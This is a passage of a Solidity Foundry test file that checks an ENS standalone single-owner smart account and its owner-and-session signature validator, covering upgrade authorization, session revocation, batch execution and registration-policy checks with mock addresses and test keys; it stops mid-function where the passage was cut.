// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

// solhint-disable private-vars-leading-underscore, func-name-mixedcase, gas-custom-errors

import {IUUPSProxy} from "@ensdomains/verifiable-factory/IUUPSProxy.sol";
import {CloneProxyBytecode} from "@ensdomains/verifiable-factory/CloneProxyBytecode.sol";
import {VerifiableFactory} from "@ensdomains/verifiable-factory/VerifiableFactory.sol";
import {DefaultReverseRegistrar} from "@ens/contracts/reverseRegistrar/DefaultReverseRegistrar.sol";
import {IMulticallable} from "@ens/contracts/resolvers/IMulticallable.sol";
import {COIN_TYPE_ETH} from "@ens/contracts/utils/ENSIP19.sol";
import {EntryPoint} from "account-abstraction/core/EntryPoint.sol";
import {IEntryPoint} from "account-abstraction/interfaces/IEntryPoint.sol";
import {PackedUserOperation} from "account-abstraction/interfaces/PackedUserOperation.sol";
import {TestPaymasterAcceptAll} from "account-abstraction/test/TestPaymasterAcceptAll.sol";
import {
    IModuleManagerEventsAndErrors
} from "nexus/interfaces/base/IModuleManagerEventsAndErrors.sol";
import {Nexus} from "nexus/Nexus.sol";
import {ExecLib} from "nexus/lib/ExecLib.sol";
import {
    CALLTYPE_DELEGATECALL,
    EXECTYPE_DEFAULT,
    MODE_DEFAULT,
    ModeLib,
    ModePayload
} from "nexus/lib/ModeLib.sol";
import {Execution} from "nexus/types/DataTypes.sol";
import {ERC1271_MAGICVALUE} from "nexus/types/Constants.sol";
import {Create2} from "@openzeppelin/contracts/utils/Create2.sol";

import {Test} from "forge-std/Test.sol";

import {
    MockExecutorModule,
    MockStandaloneHCA,
    MockValidatorModule
} from "../../mocks/MockStandaloneHCAStack.sol";

import {Grant} from "~src/access-control/interfaces/IEACGrantInitializable.sol";
import {EACBaseRolesLib} from "~src/access-control/libraries/EACBaseRolesLib.sol";
import {HCAOwnerAndSessionValidator} from "~src/hca/HCAOwnerAndSessionValidator.sol";
import {HCAExecutionLib} from "~src/hca/libraries/HCAExecutionLib.sol";
import {HCAOperationHashLib} from "~src/hca/libraries/HCAOperationHashLib.sol";
import {HCARegistrarPolicyLib} from "~src/hca/libraries/HCARegistrarPolicyLib.sol";
import {HCASignatureLib} from "~src/hca/libraries/HCASignatureLib.sol";
import {StandaloneHCAFactory} from "~src/hca/StandaloneHCAFactory.sol";
import {StandaloneSingleOwnerHCA} from "~src/hca/StandaloneSingleOwnerHCA.sol";
import {IStandaloneHCAFactory} from "~src/hca/interfaces/IStandaloneHCAFactory.sol";
import {IStandaloneHCAOwner} from "~src/hca/interfaces/IStandaloneHCAOwner.sol";
import {IRentPriceOracle} from "~src/registrar/interfaces/IRentPriceOracle.sol";
import {IRentPriceOracleProvider} from "~src/registrar/interfaces/IRentPriceOracleProvider.sol";
import {IPermissionedRegistry} from "~src/registry/interfaces/IPermissionedRegistry.sol";
import {RegistryRolesLib} from "~src/registry/libraries/RegistryRolesLib.sol";
import {
    IPermissionedResolverInitializable
} from "~src/resolver/interfaces/IPermissionedResolverInitializable.sol";
import {IAddressSetter} from "~src/resolver/interfaces/setters/IAddressSetter.sol";
import {ITextSetter} from "~src/resolver/interfaces/setters/ITextSetter.sol";
import {INameSetter} from "~src/resolver/interfaces/setters/INameSetter.sol";
import {IAddressSet} from "~src/utils/interfaces/IAddressSet.sol";

/// @title Standalone Single-Owner HCA Tests
/// @notice Exercises account ownership, sessions, execution, and upgrade authorization.
contract StandaloneSingleOwnerHCATest is Test {
    string internal constant PERMISSIONED_ADDRESS_SET_ARTIFACT =
        "src/utils/PermissionedAddressSet.sol:PermissionedAddressSet";
    string internal constant PERMISSIONED_RESOLVER_ARTIFACT =
        "src/resolver/PermissionedResolver.sol:PermissionedResolver";
    string internal constant PERMISSIONED_REGISTRY_ARTIFACT =
        "src/registry/PermissionedRegistry.sol:PermissionedRegistry";
    string internal constant STANDARD_RENT_PRICE_ORACLE_ARTIFACT =
        "src/registrar/StandardRentPriceOracle.sol:StandardRentPriceOracle";
    string internal constant ETH_REGISTRAR_ARTIFACT = "src/registrar/ETHRegistrar.sol:ETHRegistrar";

    /// @dev Layout mirror of `StandardRentPriceOracle`'s `DiscountPoint` constructor argument.
    struct OracleDiscountPoint {
        uint64 duration;
        uint128 numer;
    }

    /// @dev Layout mirror of `StandardRentPriceOracle`'s `PaymentRatio` constructor argument.
    struct OraclePaymentRatio {
        address paymentToken;
        uint128 numer;
        uint128 denom;
    }

    bytes4 constant COMMIT_SELECTOR = 0xf14fcbc8;
    bytes4 constant REGISTER_SELECTOR = 0xcff3e7c2;
    bytes4 constant RENEW_SELECTOR = 0x89d779c3;
    bytes4 constant APPROVE_SELECTOR = 0x095ea7b3;
    bytes4 constant DEPLOY_PROXY_SELECTOR = 0x5d84121a;
    bytes4 constant SET_NAME_WITH_HCA_SELECTOR = 0xab863445;
    bytes4 constant CLAIM_WITH_HCA_SELECTOR = 0xc90695df;
    bytes4 constant MULTICALL_SELECTOR = 0xac9650d8;

    bytes32 constant EXECUTION_TYPEHASH = keccak256("Ops(address to,uint256 value,bytes data)");
    bytes32 constant OPERATION_TYPEHASH =
        keccak256("Op(bytes32 vt,Ops[] ops)Ops(address to,uint256 value,bytes data)");

    bytes NAME = "\x04test\x00";
    bytes REGISTRATION_NAME = "\x05alice\x03eth\x00";

    uint256 ownerKey = 0xA11CE;
    uint256 sessionKey = 0x5E5510;
    uint256 badKey = 0xBAD;

    address owner = vm.addr(ownerKey);
    address sessionSigner = vm.addr(sessionKey);
    address defaultReverseRegistrarHCAAdapter = makeAddr("default-reverse-adapter");
    address reverseRegistrarHCAAdapter = makeAddr("addr-reverse-adapter");
    address permittedResolverImpl = makeAddr("resolver-impl");
    address ethRegistrar;
    address verifiableFactory = makeAddr("verifiable-factory");
    address usdc = makeAddr("usdc");
    address dai = makeAddr("dai");
    address resolver = makeAddr("resolver");
    address otherResolver = makeAddr("other-resolver");
    address subregistry = makeAddr("subregistry");
    address entryPoint = makeAddr("entry-point");
    address intentExecutor = makeAddr("intent-executor");
    address gasRefundPaymaster = makeAddr("gas-refund-paymaster");

    uint256 resolverSalt = 123;
    uint256 counterfactualResolverSalt = 456;
    address counterfactualResolver;

    address upgradeSetAdmin = makeAddr("upgrade-set-admin");

    HCAOwnerAndSessionValidator validator;
    HCAOwnerAndSessionValidatorHarness validatorHarness;
    IPermissionedRegistry ethRegistry;
    MockStandaloneHCA hca;
    IAddressSetApproval upgradeSet;

    function setUp() public {
        upgradeSet = _deployPermissionedAddressSet(upgradeSetAdmin);
        hca = new MockStandaloneHCA(owner);
        ethRegistry = IPermissionedRegistry(
            deployCode(
                PERMISSIONED_REGISTRY_ARTIFACT,
                abi.encode(address(0), address(this), RegistryRolesLib.ROLE_REGISTRAR_ADMIN)
            )
        );
        ethRegistrar = _deployRegistrarWithOracle(_defaultPaymentTokens());
        ethRegistry.grantRootRoles(RegistryRolesLib.ROLE_REGISTRAR, ethRegistrar);

        VerifiableFactory factory = new VerifiableFactory();
        verifiableFactory = address(factory);
        permittedResolverImpl = _deployPermissionedResolver(makeAddr("resolver-namer"));
        vm.prank(address(hca));
        resolver = factory.deployProxy(
            permittedResolverImpl,
            resolverSalt,
            abi.encodeCall(
                IPermissionedResolverInitializable.initialize,
                (_defaultGrants(), (new bytes[](0)))
            )
        );
        counterfactualResolver = _resolverAddress(factory, address(hca), counterfactualResolverSalt);

        validator = new HCAOwnerAndSessionValidator(
            defaultReverseRegistrarHCAAdapter,
            reverseRegistrarHCAAdapter,
            permittedResolverImpl,
            address(ethRegistry),
            verifiableFactory,
            intentExecutor,
            gasRefundPaymaster
        );
        validatorHarness = new HCAOwnerAndSessionValidatorHarness(
            defaultReverseRegistrarHCAAdapter,
            reverseRegistrarHCAAdapter,
            permittedResolverImpl,
            address(ethRegistry),
            verifiableFactory,
            intentExecutor,
            gasRefundPaymaster
        );
    }

    function test_standaloneSingleOwnerHCA_initializesOwner() public {
        StandaloneSingleOwnerHCA account = _newAccount();

        account.initializeAccount(abi.encode(owner));

        assertEq(account.owner(), owner);
        assertEq(account.accountId(), "ens-standalone-hca.1.1.0");
    }

    function test_standaloneSingleOwnerHCA_rejectsInvalidLifecycleActions() public {
        StandaloneSingleOwnerHCA account = _newAccount();

        vm.expectRevert(StandaloneSingleOwnerHCA.OwnerCannotBeZero.selector);
        account.initializeAccount(abi.encode(address(0)));

        account.initializeAccount(abi.encode(owner));

        vm.expectRevert(StandaloneSingleOwnerHCA.StandaloneHCAAlreadyInitialized.selector);
        account.initializeAccount(abi.encode(owner));

        vm.expectRevert(StandaloneSingleOwnerHCA.NoModuleChangeAllowed.selector);
        account.installModule(1, address(validator), "");

        vm.expectRevert(StandaloneSingleOwnerHCA.NoModuleChangeAllowed.selector);
        account.uninstallModule(1, address(validator), "");

        StandaloneSingleOwnerHCAHarness accountHarness = _newAccountHarness();
        accountHarness.initializeAccount(abi.encode(owner));
        address target = address(0xBEEF);

        vm.expectRevert(StandaloneSingleOwnerHCA.CallerNotOwner.selector);
        accountHarness.authorizeUpgradeHarness(target);

        vm.expectRevert(
            abi.encodeWithSelector(
                StandaloneSingleOwnerHCA.UpgradeTargetNotApproved.selector,
                target
            )
        );
        vm.prank(owner);
        accountHarness.authorizeUpgradeHarness(target);

        vm.prank(upgradeSetAdmin);
        upgradeSet.approve(target, true);

        vm.prank(owner);
        accountHarness.authorizeUpgradeHarness(target);

        assertFalse(accountHarness.canUpgradeFrom(target));
    }

    function test_standaloneSingleOwnerHCA_upgradesThroughVerifiableFactoryProxy() public {
        VerifiableFactory factory = new VerifiableFactory();
        StandaloneSingleOwnerHCA implementation = _newAccount();
        IAddressSetApproval predecessorUpgradeSet = _deployPermissionedAddressSet(upgradeSetAdmin);
        StandaloneSingleOwnerHCA nextImplementation = _newAccount(predecessorUpgradeSet);

        address proxy =
            factory.deployProxy(
                address(implementation),
                1,
                abi.encodeCall(StandaloneSingleOwnerHCA.initializeAccount, (abi.encode(owner)))
            );
        assertEq(StandaloneSingleOwnerHCA(payable(proxy)).owner(), owner);

        vm.prank(upgradeSetAdmin);
        upgradeSet.approve(address(nextImplementation), true);

        vm.expectRevert(
            abi.encodeWithSelector(
                IUUPSProxy.InvalidUpgradeTarget.selector,
                address(implementation),
                address(nextImplementation)
            )
        );
        vm.prank(owner);
        IUUPSProxyUpgrade(proxy).upgradeToAndCall(address(nextImplementation), "");

        vm.prank(upgradeSetAdmin);
        predecessorUpgradeSet.approve(address(implementation), true);

        vm.expectRevert(StandaloneSingleOwnerHCA.CallerNotOwner.selector);
        IUUPSProxyUpgrade(proxy).upgradeToAndCall(address(nextImplementation), "");

        vm.prank(owner);
        IUUPSProxyUpgrade(proxy).upgradeToAndCall(address(nextImplementation), "");

        (, address currentImplementation) = IUUPSProxy(proxy).getVerifiableProxyData();
        assertEq(currentImplementation, address(nextImplementation));
        assertEq(StandaloneSingleOwnerHCA(payable(proxy)).owner(), owner);
    }

    function test_standaloneSingleOwnerHCA_proxyUsesFixedExecutorWithoutInstallHook() public {
        MockValidatorModule defaultValidator = new MockValidatorModule();
        MockExecutorModule defaultExecutor = new MockExecutorModule();
        StandaloneSingleOwnerHCA implementation =
            new StandaloneSingleOwnerHCA(
                entryPoint,
                address(defaultValidator),
                address(defaultExecutor),
                "",
                upgradeSet,
                IAddressSet(address(0)),
                IStandaloneHCAFactory(address(0))
            );
        VerifiableFactory factory = new VerifiableFactory();
        StandaloneSingleOwnerHCA account =
            StandaloneSingleOwnerHCA(
                payable(
                    factory.deployProxy(
                        address(implementation),
                        2,
                        abi.encodeCall(
                            StandaloneSingleOwnerHCA.initializeAccount,
                            (abi.encode(owner))
                        )
                    )
                )
            );

        assertFalse(defaultExecutor.isInitialized(address(account)));
        assertTrue(account.isModuleInstalled(2, address(defaultExecutor), ""));

        WalletPaidTarget target = new WalletPaidTarget();
        vm.prank(address(defaultExecutor));
        account.executeFromExecutor(
            ModeLib.encodeSimpleSingle(),
            ExecLib.encodeSingle(address(target), 0, abi.encodeCall(WalletPaidTarget.setValue, (7)))
        );
        assertEq(target.value(), 7);
    }

    function test_standaloneSingleOwnerHCA_revokeSessionsBumpsNonce() public {
        StandaloneSingleOwnerHCA account = _newAccount();
        account.initializeAccount(abi.encode(owner));

        (address owner_, uint96 nonce) = account.ownerAndSessionNonce();
        assertEq(owner_, owner);
        assertEq(nonce, 0);

        vm.expectRevert(StandaloneSingleOwnerHCA.CallerNotOwner.selector);
        account.revokeSessions();

        vm.prank(owner);
        account.revokeSessions();

        (, nonce) = account.ownerAndSessionNonce();
        assertEq(nonce, 1);
    }

    function test_standaloneSingleOwnerHCA_executesWalletPaidBatchAtomically() public {
        VerifiableFactory factory = new VerifiableFactory();
        StandaloneSingleOwnerHCA implementation = _newAccount();
        StandaloneSingleOwnerHCA account =
            StandaloneSingleOwnerHCA(
                payable(
                    factory.deployProxy(
                        address(implementation),
                        2,
                        abi.encodeCall(
                            StandaloneSingleOwnerHCA.initializeAccount,
                            (abi.encode(owner))
                        )
                    )
                )
            );
        WalletPaidTarget firstTarget = new WalletPaidTarget();
        WalletPaidTarget secondTarget = new WalletPaidTarget();
        Execution[] memory executions = new Execution[](2);
        executions[0] = Execution({target: address(firstTarget), value: 0, callData: abi.encodeCall(
            WalletPaidTarget.setValue,
            (7)
        )});
        executions[1] = Execution({target: address(secondTarget), value: 0, callData: abi.encodeCall(
            WalletPaidTarget.setValue,
            (9)
        )});

        vm.expectRevert(StandaloneSingleOwnerHCA.CallerNotOwner.selector);
        account.executeByOwner(executions);

        vm.prank(owner);
        account.executeByOwner(executions);
        assertEq(firstTarget.value(), 7);
        assertEq(secondTarget.value(), 9);

        executions[0].callData = abi.encodeCall(WalletPaidTarget.setValue, (11));
        executions[1].callData = abi.encodeCall(WalletPaidTarget.fail, ());

        vm.expectRevert(WalletPaidTarget.Failed.selector);
        vm.prank(owner);
        account.executeByOwner(executions);
        assertEq(firstTarget.value(), 7);
    }

    function test_standaloneSingleOwnerHCA_rejectsNftReceivers() public {
        StandaloneSingleOwnerHCA account = _newAccount();

        vm.expectRevert(StandaloneSingleOwnerHCA.NoNFTAllowed.selector);
        IERC721Receiver(address(account)).onERC721Received(address(this), owner, 1, "");

        vm.expectRevert(StandaloneSingleOwnerHCA.NoNFTAllowed.selector);
        IERC1155Receiver(address(account)).onERC1155Received(address(this), owner, 1, 1, "");

        uint256[] memory ids = new uint256[](1);
        uint256[] memory amounts = new uint256[](1);
        ids[0] = 1;
        amounts[0] = 1;

        vm.expectRevert(StandaloneSingleOwnerHCA.NoNFTAllowed.selector);
        IERC1155Receiver(address(account)).onERC1155BatchReceived(
            address(this),
            owner,
            ids,
            amounts,
            ""
        );

        (bool success, ) = address(account).call(hex"deadbeef");
        success;
    }

    function test_validator_acceptsExistingOwnerSignatureFormats() public view {
        bytes32 digest = keccak256("owner intent");
        assertEq(hca.validate(validator, digest, _sign(ownerKey, digest)), ERC1271_MAGICVALUE);
        assertEq(
            hca.validate(validator, digest, _signRhinestoneMessage(ownerKey, digest)),
            ERC1271_MAGICVALUE
        );
        assertEq(hca.validate(validator, digest, _signV01(ownerKey, digest)), ERC1271_MAGICVALUE);
    }

    function test_standaloneSingleOwnerHCA_validatesThroughFixedDefaultValidator() public {
        MockExecutorModule defaultExecutor = new MockExecutorModule();
        StandaloneSingleOwnerHCA account =
            new StandaloneSingleOwnerHCA(
                entryPoint,
                address(validator),
                address(defaultExecutor),
                "",
                upgradeSet,
                IAddressSet(address(0)),
                IStandaloneHCAFactory(address(0))
            );
        account.initializeAccount(abi.encode(owner));

        bytes32 digest = keccak256("standalone owner intent");
        bytes memory signature = abi.encodePacked(address(0), _sign(ownerKey, digest));

        vm.prank(intentExecutor);
        assertEq(account.isValidSignature(digest, signature), ERC1271_MAGICVALUE);

        vm.prank(intentExecutor);
        assertEq(
            account.isValidSignature(digest, abi.encodePacked(address(0), _sign(badKey, digest))),
            bytes4(0xffffffff)
        );

        bytes32 erc7739DetectionHash = bytes32((type(uint256).max / 0xffff) * 0x7739);
        vm.expectRevert(HCAOwnerAndSessionValidator.InvalidSessionData.selector);
        vm.prank(intentExecutor);
        account.isValidSignature(erc7739DetectionHash, "");

        vm.expectRevert(
            abi.encodeWithSelector(
                IModuleManagerEventsAndErrors.ValidatorNotInstalled.selector,
                address(validator)
            )
        );
        vm.prank(intentExecutor);
        account.isValidSignature(
            digest,
            abi.encodePacked(address(validator), _sign(ownerKey, digest))
        );
    }

    function test_validator_rejectsInvalidOwnerAuthorization() public {
        bytes32 digest = keccak256("owner intent");

        vm.expectRevert(HCAOwnerAndSessionValidator.CallerNotIntentExecutor.selector);
        validator.isValidSignatureWithSender(address(this), digest, _sign(ownerKey, digest));

        vm.expectRevert(HCAOwnerAndSessionValidator.OwnerUnavailable.selector);
        validator.isValidSignatureWithSender(intentExecutor, digest, _sign(ownerKey, digest));

        MockStandaloneHCA zeroOwnerHCA = new MockStandaloneHCA(address(0));
        vm.expectRevert(HCAOwnerAndSessionValidator.OwnerUnavailable.selector);
        zeroOwnerHCA.validate(validator, digest, _sign(ownerKey, digest));

        vm.expectRevert(HCAOwnerAndSessionValidator.InvalidSigner.selector);
        hca.validate(validator, digest, _sign(badKey, digest));

        vm.expectRevert(HCAOwnerAndSessionValidator.InvalidSigner.selector);
        hca.validate(validator, digest, abi.encodePacked(bytes32(0), bytes32(0), uint8(29)));

        vm.expectRevert(HCAOwnerAndSessionValidator.InvalidSigner.selector);
        hca.validate(validator, digest, abi.encodePacked(bytes32(0), bytes32(0), uint8(27)));

        vm.expectRevert(HCAOwnerAndSessionValidator.InvalidSigner.selector);
        hca.validate(
            validator,
            digest,
            abi.encodePacked(bytes32(uint256(1)), bytes32(type(uint256).max), uint8(27))
        );

        vm.expectRevert(HCAOwnerAndSessionValidator.InvalidSigner.selector);
        validatorHarness.recoverHarness(digest, hex"1234");

        vm.expectRevert(HCAOwnerAndSessionValidator.InvalidSessionData.selector);
        hca.validate(validator, digest, hex"1234");
    }

    function test_validator_matchesRhinestoneSingleChainDigest() public {
        HCAOwnerAndSessionValidatorHarness vectorValidator =
            new HCAOwnerAndSessionValidatorHarness(
                defaultReverseRegistrarHCAAdapter,
                reverseRegistrarHCAAdapter,
                permittedResolverImpl,
                address(ethRegistry),
                verifiableFactory,
                address(0x5678),
                gasRefundPaymaster
            );
        Execution[] memory executions = new Execution[](1);
        executions[0] = Execution({target: address(0x9aBc), value: 0, callData: abi.encodeWithSelector(
            COMMIT_SELECTOR,
            bytes32(uint256(0x1111111111111111111111111111111111111111111111111111111111111111))
        )});
        bytes memory operationData = _erc1271OperationData(executions);

        assertEq(
            vectorValidator.singleChainDigestHarness(address(0x1234), 123, operationData),
            0xf6f3d7bdea733a1628607600e6a4e40c52ba9edce5de6f9303852f4ed613e012
        );
    }

    function testFuzz_validator_hashesPackedZeroValueOperations(
        address firstTarget,
        bytes calldata firstCallData,
        address secondTarget,
        bytes calldata secondCallData,
        bool includeSecond
    )
        public
        view
    {
        uint256 firstLength = firstCallData.length > 256 ? 256 : firstCallData.length;
        uint256 secondLength = secondCallData.length > 256 ? 256 : secondCallData.length;
        bytes memory firstData = firstCallData[:firstLength];
        bytes memory secondData = secondCallData[:secondLength];
        Execution[] memory executions = new Execution[](includeSecond ? 2 : 1);
        executions[0] = Execution({target: firstTarget, value: 0, callData: firstData});
        if (includeSecond) {
            executions[1] = Execution({target: secondTarget, value: 0, callData: secondData});
        }

        bytes32[] memory executionHashes = new bytes32[](executions.length);
        for (uint256 i; i < executions.length; ++i) {
            executionHashes[i] = keccak256(
                abi.encode(
                    EXECUTION_TYPEHASH,
                    executions[i].target,
                    executions[i].value,
                    keccak256(executions[i].callData)
                )
            );
        }
        bytes32 expectedHash =
            keccak256(
                abi.encode(
                    OPERATION_TYPEHASH,
                    HCAOperationHashLib.ERC7579_ERC1271_MODE,
                    keccak256(abi.encodePacked(executionHashes))
                )
            );

        assertEq(
            validatorHarness.operationHashHarness(_erc1271OperationData(executions)),
            expectedHash
        );
    }

    function test_validator_allowsExactCounterfactualResolverDeployment() public view {
        bytes[] memory setters = new bytes[](2);
        setters[0] = abi.encodeCall(
            IAddressSetter.setAddress,
            (REGISTRATION_NAME, COIN_TYPE_ETH, abi.encodePacked(owner))
        );
        setters[1] = abi.encodeCall(
            ITextSetter.setText,
            (REGISTRATION_NAME, "avatar", "https://euc.li/alice.eth")
        );
        validatorHarness.checkRegistrationPolicyHarness(
            address(hca),
            owner,
            counterfactualResolver,
            _registrationWithResolverDeployment(
                permittedResolverImpl,
                counterfactualResolverSalt,
                abi.encodeCall(
                    IPermissionedResolverInitializable.initialize,
                    (_defaultGrants(), setters)
                )
            )
        );
    }

    function test_validator_rejectsDuplicateCounterfactualResolverDeployment() public {
        bytes memory deploymentCall =
            _resolverDeploymentCall(
                permittedResolverImpl,
                counterfactualResolverSalt,
                abi.encodeCall(
                    IPermissionedResolverInitializable.initialize,
                    (_defaultGrants(), new bytes[](0))
                )
            );
        Execution[] memory executions = new Execution[](3);
        executions[0] = Execution({target: verifiableFactory, value: 0, callData: deploymentCall});
        executions[1] = executions[0];
        executions[2] = Execution({target: ethRegistrar, value: 0, callData: _registerCallData(
            owner,
            counterfactualResolver
        )});
        bytes memory operationData = _operationData(executions);

        vm.expectRevert(HCAOwnerAndSessionValidator.PolicyRuleFailed.selector);
        validatorHarness.checkRegistrationPolicyHarness(
            address(hca),
            owner,
            counterfactualResolver,
            operationData
        );
    }

    function test_validator_internalPolicyGuards() public {
        HCAOwnerAndSessionValidator.SessionEnableProof memory proof;
        HCAOwnerAndSessionValidator.GasRefund memory gasRefund;

        vm.expectRevert(HCAOwnerAndSessionValidator.InvalidOperationEncoding.selector);
        validatorHarness.checkStatelessRegistrationPolicyHarness(
            address(hca),
            owner,
            proof,
            "",
            gasRefund
        );

        Execution[] memory executions = new Execution[](0);
        bytes memory operationData = _erc1271OperationData(executions);
        vm.expectRevert(HCAOwnerAndSessionValidator.PolicyRuleFailed.selector);
        validatorHarness.checkStatelessRegistrationPolicyHarness(
            address(hca),
            owner,
            proof,
            operationData,
            gasRefund
        );

        vm.expectRevert(HCAOwnerAndSessionValidator.PolicyRuleFailed.selector);
        validatorHarness.checkResolverBindingHarness(address(0), true, false);

        address undeployedResolver = makeAddr("undeployed-resolver");
        vm.expectRevert(HCAOwnerAndSessionValidator.PolicyRuleFailed.selector);
        validatorHarness.checkResolverBindingHarness(undeployedResolver, true, false);

        vm.expectRevert(HCAOwnerAndSessionValidator.PolicyRuleFailed.selector);
        validatorHarness.checkResolverBindingHarness(address(hca), true, true);

        vm.expectRevert(HCAOwnerAndSessionValidator.PolicyRuleFailed.selector);
        validatorHarness.checkResolverBindingHarness(address(hca), true, false);

        vm.expectRevert(HCAOwnerAndSessionValidator.InvalidOperationEncoding.selector);
        validatorHarness.operationHashHarness(
            _packOperation(bytes32(uint256(0xDEAD) << 240), executions)
        );

        vm.expectRevert(HCAOwnerAndSessionValidator.InvalidOperationEncoding.selector);
        validatorHarness.readUintHarness("", 0);
    }

    function test_validator_rejectsInvalidCounterfactualResolverDeployment() public {
        bytes[] memory setters = new bytes[](0);
        Grant[] memory grants = _defaultGrants();
        _expectValidationRevert(
            _registrationWithResolverDeployment(
                permittedResolverImpl,
                counterfactualResolverSalt + 1,
                abi.encodeCall(IPermissionedResolverInitializable.initialize, (grants, setters))
            ),
            counterfactualResolver,
            HCAOwnerAndSessionValidator.PolicyRuleFailed.selector
        );

        grants[0].roleBitmap = 1; // wrong roles
        _expectValidationRevert(
            _registrationWithResolverDeployment(
                permittedResolverImpl,
                counterfactualResolverSalt,
                abi.encodeCall(IPermissionedResolverInitializable.initialize, (grants, setters))
            ),
            counterfactualResolver,
            HCAOwnerAndSessionValidator.PolicyRuleFailed.selector
        );

        grants = new Grant[](1);
        grants[0] = Grant(address(hca), EACBaseRolesLib.ALL_ROLES); // missing owner
        _expectValidationRevert(
            _registrationWithResolverDeployment(
                permittedResolverImpl,
                counterfactualResolverSalt,
                abi.encodeCall(IPermissionedResolverInitializable.initialize, (grants, setters))
            ),
            counterfactualResolver,
            HCAOwnerAndSessionValidator.PolicyRuleFailed.selector
        );

        grants[0] = Grant(owner, EACBaseRolesLib.ALL_ROLES); // missing hca
        _expectValidationRevert(
            _registrationWithResolverDeployment(
                permittedResolverImpl,
                counterfactualResolverSalt,
                abi.encodeCall(IPermissionedResolverInitializable.initialize, (grants, setters))
            ),
            counterfactualResolver,
            HCAOwnerAndSessionValidator.PolicyRuleFailed.selector
        );

        grants = _defaultGrants();
        setters = new bytes[](1);
        setters[0] = abi.encodeWithSelector(APPROVE_SELECTOR, ethRegistrar, 1);
        _expectValidationRevert(
            _registrationWithResolverDeployment(
                permittedResolverImpl,
                counterfactualResolverSalt,
                abi.encodeCall(
                    IPermissionedResolverInitializable.initialize,
                    (_defaultGrants(), setters)
                )
            ),
            counterfactualResolver,
            HCAOwnerAndSessionValidator.ActionNotAllowed.selector
        );
        _expectValidationRevert(
            _registrationWithResolverDeployment(
                permittedResolverImpl,
                counterfactualResolverSalt,
                abi.encodeCall(
                    IAddressSetter.setAddress,
                    (NAME, COIN_TYPE_ETH, abi.encodePacked(owner))
                )
            ),
            counterfactualResolver,
            HCAOwnerAndSessionValidator.PolicyRuleFailed.selector
        );
    }

    function test_validator_requiresDeploymentForCounterfactualResolver() public {
        Execution[] memory executions = new Execution[](1);
        executions[0] = Execution({target: ethRegistrar, value: 0, callData: _registerCallData(
            owner,
            counterfactualResolver
        )});

        _expectValidationRevert(
            _operationData(executions),
            counterfactualResolver,
            HCAOwnerAndSessionValidator.PolicyRuleFailed.selector
        );
    }

    function test_validator_requiresCounterfactualResolverDeploymentFirst() public {
        bytes memory deploymentCall =
            _resolverDeploymentCall(
                permittedResolverImpl,
                counterfactualResolverSalt,
                abi.encodeCall(
                    IPermissionedResolverInitializable.initialize,
                    (_defaultGrants(), new bytes[](0))
                )
            );
        Execution[] memory executions = new Execution[](2);
        executions[0] = Execution({target: ethRegistrar, value: 0, callData: _registerCallData(
            owner,
            counterfactualResolver
        )});
        executions[1] = Execution({target: verifiableFactory, value: 0, callData: deploymentCall});
        _expectValidationRevert(
            _operationData(executions),
            counterfactualResolver,
            HCAOwnerAndSessionValidator.PolicyRuleFailed.selector
        );

        executions = new Execution[](2);
        executions[0] = Execution({target: counterfactualResolver, value: 0, callData: abi.encodeCall(
            ITextSetter.setText,
            (NAME, "avatar", "ipfs://avatar")
        )});
        executions[1] = Execution({target: verifiableFactory, value: 0, callData: deploymentCall});

        _expectValidationRevert(
            _operationData(executions),
            counterfactualResolver,
            HCAOwnerAndSessionValidator.PolicyRuleFailed.selector
        );
    }

    function test_validator_rejectsChangedResolverImplementation() public {
        address otherImplementation = _deployPermissionedResolver(makeAddr("other-resolver-namer"));
        vm.prank(address(hca));
        IUUPSProxyUpgrade(resolver).upgradeToAndCall(otherImplementation, "");

        _expectValidationRevert(
            _singleOperationData(
                resolver,
                0,
                abi.encodeCall(ITextSetter.setText, (NAME, "avatar", "ipfs://avatar"))
            ),
            resolver,
            HCAOwnerAndSessionValidator.PolicyRuleFailed.selector
        );
    }

    function test_validator_allowsSessionChosenRegistrationAndPrimaryNames() public view {
        validatorHarness.checkRegistrationPolicyHarness(
            address(hca),
            owner,
            resolver,
            _registrationOperationDataWithDefaultReverseName(owner, resolver, "bob.eth")
        );

        Execution[] memory executions = new Execution[](2);
        executions[0] = Execution({target: ethRegistrar, value: 0, callData: _registerCallDataForLabel(
            "alice",
            owner,
            resolver
        )});
        executions[1] = Execution({target: ethRegistrar, value: 0, callData: _registerCallDataForLabel(
            "bob",
            owner,
            resolver
        )});
        validatorHarness.checkRegistrationPolicyHarness(
            address(hca),
            owner,
            resolver,
            _operationData(executions)
        );
    }

    function test_validator_rejectsMultipleRegistryAuthorizedRegistrars() public {
        address alternateRegistrar = _deployRegistrarWithOracle(_defaultPaymentTokens());
        ethRegistry.grantRootRoles(RegistryRolesLib.ROLE_REGISTRAR, alternateRegistrar);

        Execution[] memory executions = new Execution[](2);
        executions[0] = Execution({target: ethRegistrar, value: 0, callData: _registerCallDataForLabel(
            "alice",
            owner,
            resolver
        )});
        executions[1] = Execution({target: alternateRegistrar, value: 0, callData: _registerCallDataForLabel(
            "bob",
            owner,
            resolver
        )});

        vm.expectRevert(
            abi.encodeWithSelector(
                HCAOwnerAndSessionValidator.ActionNotAllowed.selector,
                alternateRegistrar,
                REGISTER_SELECTOR
            )
        );
        validatorHarness.checkRegistrationPolicyHarness(
            address(hca),
            owner,
            resolver,
            _operationData(executions)
        );
    }

    function test_validator_rejectsApprovalForAnotherRegistryAuthorizedRegistrar() public {
        address alternateRegistrar = _deployRegistrarWithOracle(_defaultPaymentTokens());
        ethRegistry.grantRootRoles(RegistryRolesLib.ROLE_REGISTRAR, alternateRegistrar);

        Execution[] memory executions = new Execution[](2);
        executions[0] = Execution({target: ethRegistrar, value: 0, callData: _registerCallData(
            owner,
            resolver
        )});
        executions[1] = Execution({target: usdc, value: 0, callData: abi.encodeWithSelector(
            APPROVE_SELECTOR,
            alternateRegistrar,
            1 ether
        )});

        vm.expectRevert(HCAOwnerAndSessionValidator.PolicyRuleFailed.selector);
        validatorHarness.checkRegistrationPolicyHarness(
            address(hca),
            owner,
            resolver,
            _operationData(executions)
        );
    }

    function test_validator_acceptsReverseClaimForOwnerWithSessionResolver() public view {
        validatorHarness.checkRegistrationPolicyHarness(
            address(hca),
            owner,
            resolver,
            _singleOperationData(
                reverseRegistrarHCAAdapter,
                0,
                abi.encodeWithSelector(CLAIM_WITH_HCA_SELECTOR, owner, resolver)
            )
        );
    }

    function test_validator_acceptsReverseClaimWithZeroResolver() public view {
        validatorHarness.checkRegistrationPolicyHarness(
            address(hca),
